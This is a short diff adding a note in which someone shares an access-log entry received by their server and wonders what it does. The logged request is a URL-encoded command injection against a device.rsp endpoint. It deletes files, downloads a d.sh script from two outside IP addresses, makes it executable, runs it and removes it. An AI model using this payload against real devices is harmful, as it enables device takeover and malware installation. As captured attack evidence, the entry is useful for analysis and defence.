@@ -1,0 +1,6 @@
+### heres an amusing string i found coming at me from HK
+
+204.76.203.49 - - [27/Jan/2026:14:51:14 +0000] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd+%2Ftmp+%7C%7C+cd+%2Fvar%2Ftmp+%7C%7C+cd+%2Fvar%2Frun+%7C%7C+cd+%2Fmnt+%7C%7C+cd+%2Froot+%7C%7C+cd+%2F%3Brm+-rf+sys64%2A%3Bwget+http%3A%2F%2F204.76.203.49%2Fd.sh+%7C%7C+curl+-O+--connect-timeout+10+http%3A%2F%2F223.26.52.213%2Fd.sh%3Bchmod+%2Bx+d.sh%3Bchmod+777+d.sh%3B.%2Fd.sh+v5jxp90%3Brm+-f+d.sh%25%21%28EXTRA+string%3D223.26.52.213%2C+string%3D%2F%2C+string%3Dxp8%29 HTTP/1.1"
+
+  huh, I wonder what that could do??
+  it was in my access.log file
